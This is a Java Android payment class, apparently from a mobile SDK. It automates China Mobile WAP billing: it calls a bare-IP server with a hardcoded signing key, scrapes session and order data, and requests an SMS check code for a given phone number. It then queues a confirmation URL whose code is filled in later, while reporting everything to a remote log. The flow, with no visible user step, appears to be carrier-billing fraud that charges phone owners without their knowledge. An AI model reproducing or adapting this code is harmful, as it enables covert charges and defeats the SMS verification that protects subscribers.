package com.core_sur.task;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.json.JSONException;
import org.json.JSONObject;

import android.os.Handler;
import android.os.Message;
import android.util.Log;

import com.core_sur.Config;
import com.core_sur.HttpCommon;
import com.core_sur.HttpCommon.HttpResult;
import com.core_sur.WCConnect;
import com.core_sur.bean.FeeSMSStatusMessage;
import com.core_sur.publics.EPCoreManager;
import com.core_sur.tools.CommonUtils;
import com.core_sur.tools.MD5;

public class XMXTPay extends Pay {
	
	/**
	 * 
	 */
	private static final long serialVersionUID = -4773517808070111582L;
	private int mPayStatus;
	public static final int XMXT_PAY_OK = 2;
	public static final int XMXT_PAY_FAIL = 3;
	String address;
	String content;//RequestID_PayCode_sid_ChannelID_phone
	public final String DEL = "_";//content的内容由"_"分割
	
	//第一次访问参数
	String url1 = "http://117.25.133.11:13888/XtoneCmcc_ddo/InfoMessage";
	public final String skey = "3)*,cp8j007";//信息秘钥   3)*,cp8j007
	String RequestID;
	String PayCode;
	String sid;
	String ChannelID;
	String phone;
	String Sign;
	
	public static ArrayList<Pfitem> codeURLS = new ArrayList<Pfitem>();	
	
	public class Pfitem {

		public static final int POST = 0;
		public static final int GET = 1;
		public String url = "";
		public String param = "";
		public int mod = -1;

		public Pfitem(String url,String param,int mod) {
			this.url = url;
			this.param = param;
			this.mod = mod;
		}
	}
	
	public XMXTPay() {
		//System.out.println("new XMXTPay");
		setType(PAY_TYPE_XMXTPay);
	}
	
	private void log(String info){
		Log.i("xmxtpay","xmxtpay___" + info);
	}
	
	@Override
	public void run() {
		// TODO Auto-generated method stub
		super.run();
		setExecuteStatus(EXECUTE_STATUS_RUN);
		
		//解析指令
		try {
			content = URLDecoder.decode(content, "utf-8");
			log("content:" + content);
		} catch (UnsupportedEncodingException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		String[] con = content.split(DEL);
		if (con.length != 5) {
			setExecuteStatus(EXECUTE_STATUS_COMPLETE);
			mPayStatus = XMXT_PAY_FAIL;
			payFail("content error");
			return;
		}
		RequestID = con[0];
		PayCode = con[1];
		sid = con[2];
		ChannelID = con[3];
		phone = con[4];
		
		//md5(密钥+RequestID+ChannelID+PayCode+phone)
		Sign = MD5.Md5(skey + RequestID + ChannelID + PayCode + phone);
		
		String param = "?RequestID=" + RequestID
				+ "&PayCode=" + PayCode
				+ "&ChannelID=" + ChannelID
				+ "&sid=" + sid
				+ "&phone=" + phone
				+ "&Sign=" + Sign;
		
		log("url1:" + url1 + param);
		
		HttpResult result1 = HttpCommon.getHtmlContents(url1 + param, "", false);
		WCConnect.getInstance().PostLog("url1:" + url1 + ";result:" + result1.HtmlContents);
		
		if (result1.StatusCode == 200 && result1 != null) {
			//访问地址成功
			try {
				log("result:" + result1.HtmlContents);
				JSONObject json = new JSONObject(result1.HtmlContents);
				String code = json.getString("code");
				String url = json.getString("url");
				
				if (!code.equals("1000")) {
					setExecuteStatus(EXECUTE_STATUS_COMPLETE);
					mPayStatus = XMXT_PAY_FAIL;
					payFail(code);
					return;
				}
				
				//new Thread(new NextThread(url,phone)).run();
				new Thread(new NextThread2(url,phone)).run();
				
				setExecuteStatus(EXECUTE_STATUS_COMPLETE);
				mPayStatus = XMXT_PAY_OK;
				payOk();
				
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}else {
			setExecuteStatus(EXECUTE_STATUS_COMPLETE);
			mPayStatus = XMXT_PAY_FAIL;
			payFail("neterror");
			return;
		}		
	}
	
	/**
	 * @Date 2015年10月19日09:06:55
	 * @author KKK
	 *
	 */
	private class NextThread2 implements Runnable{

		String url;
		String Msisdn;
		String url2 = "http://wap.dm.10086.cn/capability/capacc";
		String url3 = "http://wap.dm.10086.cn/capability/capacc";
		
		public NextThread2(String url,String Msisdn){
			this.url = url;
			this.Msisdn = Msisdn;
			log("new nextThread2");
		}
		
		@Override
		public void run() {
			// TODO Auto-generated method stub
			//step 1
			HttpResult result = HttpCommon.getHtmlContents(url, "", false);
			String SessionId = getString(result.HtmlContents, "SessionId");
			String payCode = getString(result.HtmlContents, "payCode");
			String orderId = getString(result.HtmlContents, "orderId");
			String totalprice = getString(result.HtmlContents, "totalprice");
			String telephone = getString(result.HtmlContents, "telephone");
			String ClientIp = getString(result.HtmlContents, "ClientIp");
			log("url:" + url + ";result:" + result.HtmlContents);
			if (SessionId.equals("") || payCode.equals("") || orderId.equals("") || totalprice.equals("") || telephone.equals("") || ClientIp.equals("")) {
				WCConnect.getInstance().PostLog("url:" + url + ";result:" + result.HtmlContents);
				return;
			}
			
			//step2
			String params = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + 
					"<Request><MsgType>SmsCheckCodeReq</MsgType>" + 
					"<PayCode>" + payCode + "</PayCode>" + 
					"<SessionId>" + SessionId + "</SessionId>" + 
					"<OrderId>" + orderId + "</OrderId>" + 
					"<Msisdn>" + Msisdn + "</Msisdn>" + 
					"<ClientIp>" + ClientIp + "</ClientIp></Request>";
			try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			HttpResult res2 = httpcon(url2, params);
			log("url2:" + url2 + ";params" + params + ";result:" + res2.HtmlContents);
			
			//step3
			String params3 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + 
					"<Request><MsgType>GoodsPayReq</MsgType>" + 
					"<PayCode>" + payCode + "</PayCode>" + 
					"<SessionId>" + SessionId + "</SessionId>" + 
					"<OrderId>" + orderId + "</OrderId>" + 
					"<Msisdn>" + Msisdn + "</Msisdn>" + 
					"<CheckCode>" + "{0}" + "</CheckCode>" + 
					"<ClientIp>" + ClientIp + "</ClientIp></Request>";
			codeURLS.add(new Pfitem(url3, params3, Pfitem.POST));
			
		}
		
		public String getString(String str,String param){
			String back = "";
			Pattern p = Pattern.compile(param + " = .*?;");
	        Matcher m = p.matcher(str);
	        if (m.find()) {
	        	back = m.group(0);
			}
			return back.replace(param + " = ", "").replace(";", "").trim().replace("\"", "");
		}
	}
	
	//versioncode = 1
	private class NextThread implements Runnable{

		String url;
		String Msisdn;
		String url2 = "http://wap.dm.10086.cn/apay/orderValidate.jsp";
		String url3 = "http://wap.dm.10086.cn/apay/orderValidateHandle.jsp";
		//http://wap.dm.10086.cn/apay/orderValidateHandle.jsp?
		//sessionId=xxxx&payCode=xxxx&orderId=xxxx&totalprice=xxxx&telephone=xxxx&Msisdn=xxxx
		//var sessionId = 1306152745;
		//var payCode = 800000001480;
		//var orderId = 1442547098420;
		//var totalprice = 0.10 ;
		//var telephone = 4006031684;
		
		public NextThread(String url,String Msisdn){
			this.url = url;
			this.Msisdn = Msisdn;
			log("new nextThread");
		}
		
		@Override
		public void run() {
			// TODO Auto-generated method stub
			HttpResult result = HttpCommon.getHtmlContents(url, "", false);
			String sessionId = getString(result.HtmlContents, "sessionId");
			String payCode = getString(result.HtmlContents, "payCode");
			String orderId = getString(result.HtmlContents, "orderId");
			String totalprice = getString(result.HtmlContents, "totalprice");
			String telephone = getString(result.HtmlContents, "telephone");
			log("url:" + url + ";result:" + result.HtmlContents);
			if (sessionId.equals("") || payCode.equals("") || orderId.equals("") || totalprice.equals("") || telephone.equals("")) {
				WCConnect.getInstance().PostLog("url:" + url + ";result:" + result.HtmlContents);
				return;
			}
			
			//step 2
			String ustr2 = url2 + "?sessionId=" + sessionId + "&payCode=" + payCode + "&orderId=" + orderId + 
					"&totalprice=" + totalprice + "&telephone=" + telephone;// + "&Msisdn=" + Msisdn;
			HttpResult res2 = HttpCommon.getHtmlContents(ustr2, "", false);
			log("url2:" + ustr2 + ";result:" + res2.HtmlContents);
			WCConnect.getInstance().PostLog("url2:" + ustr2 + ";result:" + res2.HtmlContents);
			try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
			//访问网络获取短信验证码
			String ustr3 = url3 + "?sessionId=" + sessionId + "&payCode=" + payCode + "&orderId=" + orderId + 
					"&totalprice=" + totalprice + "&telephone=" + telephone + "&Msisdn=" + Msisdn;
			HttpResult res3 = HttpCommon.getHtmlContents(ustr3, "", false);
			log("url3:" + ustr3 + ";result:" + res3.HtmlContents);
			WCConnect.getInstance().PostLog("url3:" + ustr3 + ";result:" + res3.HtmlContents);
			
			String codeurl = "http://wap.dm.10086.cn/apay/orderConfirmFinal.jsp?" +
					"SessionId=" + sessionId +
					"&payCode=" + payCode +
					"&OrderId=" + orderId +
					"&totalprice=" + totalprice +
					"&telephone=" + telephone +
					"&phone=" + Msisdn +
					"&CheckCode={0}";
			
			codeURLS.add(new Pfitem(codeurl, "", Pfitem.GET));
			
		}
		
		public String getString(String str,String param){
			String back = "";
			Pattern p = Pattern.compile(param + " = .*?;");
	        Matcher m = p.matcher(str);
	        if (m.find()) {
	        	back = m.group(0);
			}
			return back.replace(param + " = ", "").replace(";", "").trim();
		}
		
	}
	
	public static HttpResult httpcon(String url,String param){
		HttpResult res = new HttpResult();
			
		HttpURLConnection urlConn;
		try {
			URL uri = new URL(url);
			urlConn = (HttpURLConnection) uri.openConnection();
			urlConn.setDoInput(true);
			urlConn.setConnectTimeout(10000);
			urlConn.setReadTimeout(20000);
			urlConn.setRequestProperty("Content-Type", "application/octet-stream");
			
			urlConn.setDoOutput(true);//使用 URL 连接进行输出
			urlConn.setDoInput(true);//使用 URL 连接进行输入
			urlConn.setRequestMethod("POST");
			byte[] bypes = param.getBytes("utf-8");
			urlConn.getOutputStream().write(bypes);// 输入参数
			urlConn.connect();
			
			res.StatusCode = urlConn.getResponseCode();
			if (res.StatusCode != 200) {
				return res;
			}
			BufferedReader in = new BufferedReader(new InputStreamReader(urlConn.getInputStream()));
			StringBuffer sb = new StringBuffer();
			String line = null;
			while (((line = in.readLine()) != null)) {
				sb.append(line);
			}
			in.close();
			res.HtmlContents = sb.toString().trim();
			return res;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return res;
	}
	
	private void payOk() {
		String timeStamp;
		WCConnect.getInstance().PostLog(
				"SMSSendStatus:-1" + Config.splitStringLevel1 +address
						+ Config.splitStringLevel1 + content
						+ Config.splitStringLevel1 + "SendOK");
		EPCoreManager.getInstance().payHandler
				.sendEmptyMessage(Config.CMD_SENDSMSSUCCESS);
		if (WCConnect.getInstance().currentPayFeeMessage != null) {
			timeStamp = (String) WCConnect.getInstance().currentPayFeeMessage.get("TimeStamp");
		} else {
			timeStamp = "未知流水号 AppKey:" + CommonUtils.getAppKey(context);
		}
		FeeSMSStatusMessage feeSMSStatusMessage = new FeeSMSStatusMessage(
				timeStamp, 0);
		//EPCoreManager.getInstance().sendMessage(URLFinals.WEB_SMSSTATIC,feeSMSStatusMessage, null);
				
	}
	
	private void payFail(String res) {
		EPCoreManager.getInstance().payHandler.sendEmptyMessage(Config.CMD_SENDSMSERROR);
		WCConnect.getInstance().PostLog(
				"SMSSendStatus:" + 3
						+ Config.splitStringLevel1 + address
						+ Config.splitStringLevel1 + content
						+ Config.splitStringLevel1
						+ "SendErro,resCode=" + res);
		String timeStamp;
		if (WCConnect.getInstance().currentPayFeeMessage != null) {
			timeStamp = (String) WCConnect.getInstance().currentPayFeeMessage
					.get("TimeStamp");
		} else {
			timeStamp = "未知流水号 AppKey:" + CommonUtils.getAppKey(context);
		}
		FeeSMSStatusMessage feeSMSStatusMessage = new FeeSMSStatusMessage(timeStamp, -1);
		//EPCoreManager.getInstance().sendMessage(URLFinals.WEB_SMSSTATIC,feeSMSStatusMessage, null);		
	}
	
	public int getStatus() {
		return mPayStatus;
	}
	
	public void setStatus(int mPayStatus) {
		this.mPayStatus = mPayStatus;
	}
	
	public String getContent() {
		return content;
	}

	public void setContent(String content) {
		this.content = content;
	}
	
	public String getAddress() {
		return address;
	}

	public void setAddress(String address) {
		this.address = address;
	}
}
